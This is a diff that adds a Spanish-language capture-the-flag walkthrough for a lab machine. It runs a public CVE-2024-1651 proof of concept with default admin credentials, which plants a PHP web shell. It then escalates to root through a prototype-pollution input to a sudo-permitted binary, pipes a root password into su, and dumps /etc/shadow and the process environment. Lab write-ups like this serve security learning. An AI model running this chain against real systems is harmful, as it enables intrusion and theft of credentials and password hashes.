@@ -1,1 +1,100 @@
+Agregar la direccion IP de la maquina a /etc/hosts (en Linux y MacOS)
 
+Debe de quedar de la siguiente manera para que lo reconozca nuestra PC:
+10.0.14.51    shadowpier.echocity-f.com
+
+Puertos Descubiertos:
+22: SSH
+80: HTTP
+
+Credenciales de acceso a la pagina:
+user: admin
+password: admin
+
+Descargar en su directorio de su carpeta personal el siguinete repositorio de GitHub donde usaremos una herramienta de vulnerabilidad:
+git clone https://github.com/sharpicx/CVE-2024-1651-PoC
+cd CVE-2024-1651-PoC
+
+Ahora lo ejecutaremos de la siguiente manera para poder escalar sin hacer una revershell:
+python exploit.py -u admin -p admin -s shadowpier.echocity-f.com -f 3
+
+nos devolvera algo parecido:
+[+] login successful!
+[+] bb_data = 'a%3A3%3A%7Bs%3A2%3A%22uk%22%3Bs%3A32%3A%229lAHzMdkU8x6Ryt3kd2SzrICoyIVSnCL%22%3Bs%3A3%3A%22uid%22%3Bi%3A2%3Bs%3A3%3A%22sid%22%3Bs%3A20%3A%22iaHT4glLQftpPovZTmNL%22%3B%7D'
+[+] generating deserialization Guzzle/FW1 payload
+[+] RCE will be at http://shadowpier.echocity-f.com/data/uploads/xwdcuyor.php
+[+] shell uploaded!
+[+] popping shell!
+RCE> 
+ESTAMOS DENTRO!!!
+
+Ejecutamos estos comandos para ver si todo funciona bien:
+id
+whoami
+pwd
+
+nos debe devolver parecido a esto: 
+RCE> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+RCE> whoami
+www-data
+
+RCE> pwd
+/var/www/html/data/uploads
+
+Revisamos permisos que tenemos como usuario normal:
+
+RCE> sudo -l
+Matching Defaults entries for www-data on shadowpier:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User www-data may run the following commands on shadowpier:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/charter
+
+Ponemos este comando:
+sudo /usr/local/bin/charter '{"__proto__":{"is_admin":true,"user":[{"path":"/etc/shadow"},{}]}}'
+
+Nos debe regresar esto:
+RCE> sudo /usr/local/bin/charter '{"__proto__":{"is_admin":true,"user":[{"path":"/etc/shadow"},{}]}}'
+Well done!
+root:$y$j9T$X0CAT5D8Wm72iN8zw0Ow80$q1kLCv1P.cE3yqNJGO2B93FSc/nZUC71m/PDLqColP.:20019:0:99999:7:::
+daemon:*:19709:0:99999:7:::
+bin:*:19709:0:99999:7:::
+sys:*:19709:0:99999:7:::
+sync:*:19709:0:99999:7:::
+games:*:19709:0:99999:7:::
+man:*:19709:0:99999:7:::
+lp:*:19709:0:99999:7:::
+mail:*:19709:0:99999:7:::
+news:*:19709:0:99999:7:::
+uucp:*:19709:0:99999:7:::
+proxy:*:19709:0:99999:7:::
+www-data:*:19709:0:99999:7:::
+backup:*:19709:0:99999:7:::
+list:*:19709:0:99999:7:::
+irc:*:19709:0:99999:7:::
+_apt:*:19709:0:99999:7:::
+nobody:*:19709:0:99999:7:::
+systemd-network:!*:19725::::::
+messagebus:!:19725::::::
+polkitd:!*:19725::::::
+mysql:!:20019::::::
+sshd:!:20019::::::
+
+
+Ejecución con credenciales directas
+Como su root requiere ingresar la clave de forma interactiva (lo cual no es posible en la web shell), para ejecutar comandos como root sin TTY se suele pasar la contraseña directamente por la entrada estándar usando su -c junto con printf o echo:
+printf "shadowpier\n" | su root -c "id"
+
+Si el comando anterior devuelve uid=0(root), significa que la autenticación fue exitosa. A partir de ahí, puedes ejecutar cualquier comando con permisos de superusuario cambiando la instrucción dentro de -c "":
+
+RCE> printf "shadowpier\n" | su root -c "id"
+uid=0(root) gid=0(root) groups=0(root)
+
+Banderas:
+
+RCE> printf "shadowpier\n" | su root -c "cat /etc/shadow"
+RCE> printf "shadowpier\n" | su root -c "cat /proc/1/environ"
+RCE> printf "shadowpier\n" | su root -c "ls -la /root"
+RCE> printf "shadowpier\n" | su root -c "cat /etc/passwd"
